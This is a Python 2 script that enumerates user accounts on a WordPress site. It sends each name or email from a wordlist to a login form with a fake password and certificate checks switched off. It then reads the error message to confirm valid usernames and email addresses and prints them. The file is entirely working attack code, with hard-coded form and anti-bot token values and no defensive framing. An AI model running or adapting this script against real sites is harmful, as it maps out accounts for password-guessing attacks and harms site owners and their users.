#!/usr/bin/python
import urllib,urllib2,ssl,sys,optparse



# Support SSL Connections & Ignore SSL Certificate Validation
ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE



# this method check whether the Username/Email is valid or not.
def isValidUsername(content):
    #print content.find("Redirecting")
    if content.find("The password you entered for the username") > 0:
		return True
    else:
        return False
		
# This method extract the username that is related to the valid email address
def extractUsername(content):
    #print content.find("Redirecting")
	usernameOffset = content.find("the username <strong>")
	secondOffset = content[usernameOffset+21:].find("</strong>")
	return content[usernameOffset+21:usernameOffset+21+secondOffset]
	

## This is the main function
if __name__ == '__main__':

	# Show HELP
	p = optparse.OptionParser("usage: %prog [http|https]://www.domainName.com loginPage userfile", version="%prog 0.1")
	p.add_option("-d", "--domainName", dest="domainName", type="string", help="specify domainName to run on")
	p.add_option("-u", "--userfile", dest="usernameFile", type="string", help="file of usernames")
	p.add_option("-l", "--loginPage", dest="loginPage", type="string", help="WordPress Login Page")
	(options, args) = p.parse_args()
	domainName = options.domainName
	usernameFile = options.usernameFile
	loginPage = options.loginPage
	
	# check the command line arguments and Show how to use the script
	if len(sys.argv) != 7:
		sys.exit("\n\nUse -h option for help \n\n")

	
	# Set the URI and useragent
	site = domainName + '/' + loginPage
	hdr = {'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'}
    
	# Open the usernames wordlist file in a read mode
	try:
		file = open(usernameFile, 'r')
	except IOError as e:
		sys.exit("\n[-] " + usernameFile + " File does not exist!")

	
	# Loop over the username list
	for username in file: 

		# Remove the new line character from the username
		if username[-1] == "\n": 
			username = username[:-1]
		
		values = { 'username-679': username,'user_password-679': 'password', 'form_id':679, 'request':'', 'LTCx-C-YkJ-d-S':'JYZUPu62ATnbfH5UZoTgnFHINiRnQTuypsuyZ2xLn06yud6LPzmbWADbt6T7NqgPJvmJgyjA8m6_to5mJ2gTz-T28VEe7AUKK7iex5-sGH6r2s8MldoYTY2Vx0VQZUdM', 'ZQS-dSU-hb-gYy-E-Hpo':'76810.0truetrue'}
		data = urllib.urlencode(values)

		# in this build opener we overwrite SSL configuration
		# and we send our request and get the response.
		opener = urllib2.build_opener(urllib2.HTTPSHandler(context=ctx))
		req = urllib2.Request(site, data,headers=hdr)
		page = opener.open(req)
		content = page.read()

		#check whether the username/email address is valid or not
		if isValidUsername(content):
			extractedUsername = extractUsername(content)
			
			# check if the username and email address have been enumerated or just the username.
			if username != extractedUsername:
				print "[+] Valid Email Address: \""+ username + "\"" + " and Valid Username: \"" + extractedUsername + "\""
			else:
				print "[+] Valid Username: \"" + extractedUsername + "\""
